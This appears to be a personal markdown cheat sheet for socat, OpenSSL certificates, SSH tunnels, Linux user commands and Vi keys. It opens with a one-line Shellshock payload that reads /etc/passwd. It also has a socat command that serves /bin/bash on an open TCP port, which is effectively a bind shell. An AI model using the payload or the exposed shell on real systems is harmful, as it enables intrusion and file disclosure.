## shellshock

`() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" `

## socat

#### Redirect
```bash
socat TCP-LISTEN:80,fork TCP:202.54.1.5:80
socat TCP4-LISTEN:443,fork TCP4:xx.xx.xx.xx:443

```
#### Server

```bash
socat TCP-LISTEN:8800\
,reuseaddr\
,pf=ip4\
,fork -
```

#### Client

```bash
socat TCP:localhost:8800 -
```

Create a client/server **TCP** connection over **TLS/SSL**. Refer to [Generating SSL Certificates](https://blog.travismclarke.com/post/generating-ssl-certs/) for assistance creating the client/server certificates.

#### Server

```bash
socat OPENSSL-LISTEN:4443\
,reuseaddr\
,pf=ip4\
,fork\
,cert=$HOME/tmp/server.pem\
,cafile=$HOME/tmp/client.pem -
```

#### Client

```bash
socat OPENSSL:localhost:4443\
,verify=0\
,cert=$HOME/tmp/client.pem\
,cafile=$HOME/tmp/server.pem -
```

### UNIX domain socket communication

Create a UNIX domain socket for IPC (inter-process communication) with a **single (bi-directional)** endpoint.

#### Server

```bash
socat UNIX-LISTEN:/usr/local/var/run/test/test.sock -
```

#### Client

```bash
socat UNIX-CONNECT:/usr/local/var/run/test/test.sock -
```

Create a UNIX domain socket for IPC (inter-process communication) with **mutliple (bi-directional)** endpoints.

#### Server

```bash
socat UNIX-LISTEN:/usr/local/var/run/test/test.sock\
,fork -
```

#### Client

```bash
socat UNIX-CONNECT:/usr/local/var/run/test/test.sock -
```

Create UNIX domain sockets for IPC (inter-process communication) and **save the communication output to file**.

#### Server

```bash
socat UNIX-LISTEN:/usr/local/var/run/test/test.sock,fork - \
>> $HOME/tmp/socketoutput.txt
```

#### Client

```bash
socat UNIX-CONNECT:/usr/local/var/run/test/test.sock -
```

### Command execution

Execute **shell** commands on a remote server (i.e. basic ssh client).

#### Server

```bash
socat TCP-LISTEN:1234 EXEC:/bin/bash
```

#### Client

```bash
socat TCP:localhost:1234 -
```

### Tunneling

Create an encrypted tunnel between a local computer and a remote machine to relay services created through an **SSH** protocol connection.

#### Server

```bash
socat TCP-LISTEN:54321\
,reuseaddr\
,fork \
TCP:remote.server.com:22
```

#### Client

```bash
ssh root@localhost -p 54321
```

Create a virtual point-to-point IP link through a **TUN** network device.

> **Mac OS X**: requires the [TunTap](http://tuntaposx.sourceforge.net/) kernel extensions.

#### Server

```bash
socat /dev/tun0 -
```

#### Client

```bash
ifconfig tun0 10.0.0.2 10.0.0.3
ping 10.0.0.3
```
# ssl certs
## Set the filename:

```bash
FILENAME="server"
```

## Generate a 2048 bit RSA key

```bash
openssl genrsa -des3 -passout pass:x -out "$FILENAME.pass.key" 2048
openssl rsa -passin pass:x -in "$FILENAME.pass.key" -out "$FILENAME.key"
rm -f "$FILENAME.pass.key"
```

## Generate a certificate signing request

```bash
openssl req -new -key "$FILENAME.key" -out "$FILENAME.csr"
```

## Generate a signed certificate

```bash
openssl x509 -req -sha256 -days 365 -in "$FILENAME.csr" -signkey "$FILENAME.key" -out "$FILENAME.crt"
```

## Generate the PEM container

```bash
cat "$FILENAME.key" "$FILENAME.crt" > "$FILENAME.pem"
```
# openssl
openssl s_client -connect google.com:443 
# ssh tunnel
```bash
# $LOCAL_IP: 'localhost' or machine from local network
# $LOCAL_PORT: open port on local machine
# $REMOTE_IP: remote localhost or IP from remote network
# $REMOTE_PORT: open port on remote site

# Forward Tunnel: map port from remote machine/network on local machine
ssh -L $LOCAL_PORT:$REMOTE_IP:$REMOTE_PORT $USER@$SERVER

# Reverse Tunnel: make local port accessable to remote machine
ssh -R $REMOTE_PORT:$LOCAL_IP:$LOCAL_PORT $USER@$SERVER
# local port forwarding

# the target host 192.168.0.100 is running a service on port 8888

# and you want that service available on the localhost port 7777

ssh -L 7777:localhost:8888 user@192.168.0.100

# remote port forwarding

# you are running a service on localhost port 9999

# and you want that service available on the target host 192.168.0.100 port 12340

ssh -R 12340:localhost:9999 user@192.168.0.100

# Local proxy through remote host

# You want to route network traffic through a remote host target.host

# so you create a local socks proxy on port 12001 and configure the SOCKS5 settings to localhost:12001

ssh -C2qTnN -D 12001 user@target.host
```

# linux user
| Command                               | Description                                  |  |
|---------------------------------------|----------------------------------------------|--|
| sudo adduser username                 | To add a new user                            |
| sudo passwd -l 'username'             | To change the password of a user             |
| sudo userdel -r 'username'            | To remove a newly created user               |
| sudo usermod -a -G GROUPNAME USERNAME | To add a user to a group                     |
| sudo deluser USER GROUPNAME           | To remove a user from a group                |
| finger                                | Shows information of all the users logged in |
| finger username                       | Gives information of a particular user       |
# Linux Vi
| Command | Description                                                                                     |  |
|---------|-------------------------------------------------------------------------------------------------|--|
| i       | Insert at cursor (goes into insert mode)                                                        |
| a       | Write after cursor (goes into insert mode)                                                      |
| A       | Write at the end of line (goes into insert mode)                                                |
| ESC     | Terminate insert mode                                                                           |
| u       | Undo last change                                                                                |
| U       | Undo all changes to the entire line                                                             |
| o       | Open a new line (goes into insert mode)                                                         |
| dd      | Delete line                                                                                     |
| 3dd     | Delete 3 lines                                                                                  |
| D       | Delete contents of line after the cursor                                                        |
| C       | Delete contents of a line after the cursor and insert new text. Press ESC key to end insertion. |
| dw      | Delete word                                                                                     |
| 4dw     | Delete 4 words                                                                                  |
| cw      | Change word                                                                                     |
| x       | Delete character at the cursor                                                                  |
| r       | Replace character                                                                               |
| R       | Overwrite characters from cursor onward                                                         |
| s       | Substitute one character under cursor continue to insert                                        |
| S       | Substitute entire line and begin to insert at the beginning of the line                         |
| ~       | Change case of individual character                                                             |
